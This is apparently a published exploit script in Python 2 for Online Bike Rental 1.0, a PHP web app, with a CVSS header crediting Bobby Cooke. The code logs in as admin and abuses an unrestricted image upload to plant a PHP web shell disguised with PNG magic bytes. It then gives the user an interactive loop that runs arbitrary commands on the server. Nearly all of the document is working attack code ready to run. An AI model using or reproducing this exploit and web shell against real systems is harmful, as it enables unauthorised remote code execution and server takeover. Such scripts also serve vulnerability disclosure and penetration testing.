# Exploit Title: Online Bike Rental 1.0 - Authenticated Remote Code Execution
# Exploit Author: Bobby Cooke (boku)
# Date: 2020-07-31
# Vendor Homepage: ttps://www.sourcecodester.com/php/14374/online-bike-rental-phpmysql.html
# Software Link: ttps://www.sourcecodester.com/sites/default/files/download/Warren%20Daloyan/bikerental-php.zip
# Version: 1.0
# CWE-434: Unrestricted Upload of File with Dangerous Type
# Overall CVSS Score: 7.2 
# CVSS v3.1 Vector: AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H/E:F/RL:U/RC:C/CR:L/IR:L/AR:L/MAV:N/MAC:L/MPR:H/MUI:N/MS:C/MC:H/MI:H/MA:H
# CVSS Base Score: 9.1 | Impact Subscore: 6.0 | Exploitability Subscore: 2.3
# CVSS Temporal Score: 8.9 | CVSS Environmental Score: 7.2 | Modified Impact Subscore: 4.5
# Tested On: Windows 10 Pro (x64_86) + XAMPP | Python 2.7
# Vulnerability Description:
#   Online Bike Rental v1 suffers from an authenticated file upload vulnerability allowing remote attackers 
#   to gain remote code execution (RCE) on the hosting webserver via uploading a maliciously crafted image.

import requests, sys, re
from colorama import Fore, Back, Style
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
#proxies         = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
F = [Fore.RESET,Fore.BLACK,Fore.RED,Fore.GREEN,Fore.YELLOW,Fore.BLUE,Fore.MAGENTA,Fore.CYAN,Fore.WHITE]
B = [Back.RESET,Back.BLACK,Back.RED,Back.GREEN,Back.YELLOW,Back.BLUE,Back.MAGENTA,Back.CYAN,Back.WHITE]
S = [Style.RESET_ALL,Style.DIM,Style.NORMAL,Style.BRIGHT]
info = S[3]+F[5]+'['+S[0]+S[3]+'-'+S[3]+F[5]+']'+S[0]+' '
err  = S[3]+F[2]+'['+S[0]+S[3]+'!'+S[3]+F[2]+']'+S[0]+' '
ok   = S[3]+F[3]+'['+S[0]+S[3]+'+'+S[3]+F[3]+']'+S[0]+' '

def webshell(SERVER_URL, WEBSHELL_PATH, session):
    try:
        WEB_SHELL = SERVER_URL + WEBSHELL_PATH
        print(info+"Webshell URL: "+ WEB_SHELL)
        getdir  = {'s33k': 'echo %CD%'}
        req = session.post(url=WEB_SHELL, data=getdir, verify=False)
        status = req.status_code
        if status != 200:
            print(err+"Could not connect to the webshell.")
            req.raise_for_status()
        print(ok+'Successfully connected to webshell.')
        cwd = re.findall('[CDEF].*', req.text)
        cwd = cwd[0]+"> "
        term = S[3]+F[3]+cwd+F[0]
        print(S[1]+F[2]+')'+F[4]+'+++++'+F[2]+'['+F[0]+'=========>'+S[0]+S[3]+'   hyd3sec & boku   '+S[0]+S[1]+'<========'+F[2]+']'+F[4]+'+++++'+F[2]+'('+F[0]+S[0])
        while True:
            cmd     = raw_input(term)
            command = {'s33k': cmd}
            req = requests.post(WEB_SHELL, data=command, verify=False)
            status = req.status_code
            if status != 200:
                req.raise_for_status()
            resp= req.text
            print(resp)
    except:
        print('\r\n'+err+'Webshell session failed. Quitting.')
        sys.exit(-1)

def SIG():
    SIG = S[1]+"               ,(&@@@@* ,@@@@@@%(                \n"
    SIG += "        &@@@@@@@@@@@@@@@&  @@@@@@@@@@@@@(       \n"
    SIG += "    *@@@@@@@@@@@@%@@@@@@    ,,  `''@@@/  ,@@    \n"
    SIG += "   @@@@@@@@@# /@@@@@@  #@@@@@@@@@&.  * /@@@@@@  \n"
    SIG += "  @@(@@@@@  /@@@@@@  @@@@@@@@@@@@@@@` @@@@@@ @@ \n"
    SIG += " @@    ,   @@@@@@@@  #@@@@@@@@@@@@@@ &@@@    %@.\n"
    SIG += " @@       %@@@@@@@@@@  %@@@@@@@@@@@@@@.      /@#\n"
    SIG += " %@         /@@@@@@@@@@  &@@@@@@@@@@         &@ \n"
    SIG += "  @@          #    ...*&@@@@@@@@@@@*         @@ \n"
    SIG += "  ,&@@@@&      /@@@@"+S[0]+S[3]+"@hyd3sec"+S[0]+S[1]+"@@@@@      (@@@@@%  \n"
    SIG += "          @@@@  (@@%@@@@@@@@@/@@  *@@@%         \n"
    SIG += "              @@@@@@,*@@@@@ %@@@@@@ \n"
    SIG += "                @@@@@#  @  @@@@@% "+S[0]+S[3]+F[4]+"         .-----.._       ,--."+S[0]+S[1]+"\n"
    SIG += "                 &@@@@@   @@@@@   "+S[0]+S[3]+F[4]+"         |  ..    >  ___ |  | .--."+S[0]+S[1]+"\n"
    SIG += "                  @@@@@@ @@@@@*   "+S[1]+"    #  "+S[0]+S[3]+F[4]+"  |  |.'  ,'-\"   \"-. |/  /__   __\n"+S[0]+S[1]+""  
    SIG += "                  (@@@@@@@@@@@    "+S[1]+" ##### "+S[0]+S[3]+F[4]+"  |      < "+F[2]+"   * *"+F[4]+"   \   /   \\/   \\\n"+S[0]+S[1]+""  
    SIG += "                   @@&%@@@ @@@    "+S[1]+"  #    "+S[0]+S[3]+F[4]+"  |  |>   )"+F[2]+" *  *  *"+F[4]+" /    \\        \\\n"+S[0]+S[1]+""  
    SIG += "                   @@( @@  @@     "+S[0]+S[3]+F[4]+"         |____..- '-."+F[2]+"*"+F[4]+"_"+F[2]+"*"+F[4]+".-'_|\\___|._..\\___\\\n"+S[0]+S[1]+""  
    SIG += "                    &*  &  @      "+S[0]+S[3]+F[4]+"             _______"+F[2]+"github.com/boku7"+F[4]+"_____\n"+S[0]
    return SIG

def formatHelp(STRING):
    return S[3]+F[2]+STRING+S[0]

def header():
    head = S[3]+F[2]+'       --- Online Bike Rental 1.0 - Authenticated Remote Code Execution (RCE) ---\n'+S[0]
    return head

if __name__ == "__main__":
#1 | INIT
    print(header())
    print(SIG())
    if len(sys.argv) != 4:
        print(err+formatHelp("Usage:\t python %s <WEBAPP_URL> <USERNAME> <PASSWORD>" % sys.argv[0]))
        print(err+formatHelp("Example:\t python %s 'http://172.16.65.130/bikerental/' 'admin' 'Test@12345'" % sys.argv[0]))
        sys.exit(-1)
    # python CLI Arguments 
    SERVER_URL  = sys.argv[1]
    USERNAME    = sys.argv[2]
    PASSWORD    = sys.argv[3]
    # Make sure that URL has a / at end
    if not re.match(r".*/$", SERVER_URL):
        SERVER_URL = SERVER_URL+'/'
    # URLs
    LOGIN_URL   = SERVER_URL + 'admin/index.php'
    UPLOAD_URL  = SERVER_URL + 'admin/changeimage1.php?imgid=1'

#2 | Create Session
    # Create a web session in python
    s = requests.Session()
    # GET request to webserver - Start a session & retrieve a session cookie
    get_session = s.get(LOGIN_URL, verify=False) 
    # Check connection to website & print session cookie to terminal OR die
    if get_session.status_code == 200:
        print(ok+'Successfully connected to Bike Rental PHP server & created session.')
        print(info+"Session Cookie: " + get_session.headers['Set-Cookie'])
    else:
        print(err+'Cannot connect to the server and create a web session.')
        sys.exit(-1)
    # POST data to login with known admin creds
    login_data  = {'username':USERNAME, 'password':PASSWORD,'login':''}
    print(info+"Attempting to Login to Bike Rental with credentials: "+USERNAME+":"+PASSWORD)
    #auth        = s.post(url=LOGIN_URL, data=login_data, verify=False, proxies=proxies)
    auth        = s.post(url=LOGIN_URL, data=login_data, verify=False)
    loginchk    = str(re.findall(r'change-password.php', auth.text))
    # print(loginchk) # Debug - search login response for successful login
    if loginchk == "[u'change-password.php']":
        print(ok+"Login successful.")
    else:
        print(err+"Failed login. Check credentials.")
        sys.exit(-1)

#3 | File Upload
    PNG_magicBytes = '\x89\x50\x4e\x47\x0d\x0a\x1a'
    # Content-Disposition: form-data; name="img1"; filename="hyd3.php"
    # Content-Type: image/png
    websh       = {
        'img1': 
        (
            'hyd3.php', 
            PNG_magicBytes+'\n'+'<?php echo shell_exec($_REQUEST["s33k"]); ?>', 
            'image/png', 
            {'Content-Disposition': 'form-data'}
        ) 
    }
    fdata       = {'update':''}
    print(info+"Exploiting bike image file upload vulnerability to upload a PHP webshell")
    #upload_bike = s.post(url=UPLOAD_URL, files=websh, data=fdata, verify=False, proxies=proxies)
    upload_bike = s.post(url=UPLOAD_URL, files=websh, data=fdata, verify=False)

#4 | Get Webshell Upload Name
    uploadchk   = re.findall(r'img/vehicleimages/hyd3.php', upload_bike.text)
    uploadchk   = uploadchk[0]   
    # print(uploadchk) # Debug - Find webshell file upload in response
    if uploadchk == "img/vehicleimages/hyd3.php":
        print(ok+"Successfully uploaded webshell")
    else:
            print(err+"Webshell upload failed.")
            sys.exit(-1)
    webshPath   = 'admin/' + uploadchk
    print(info+"Webshell Filename: " + webshPath)

#5 | interact with webshell for Remote Command Execution
    webshell(SERVER_URL, webshPath, s)
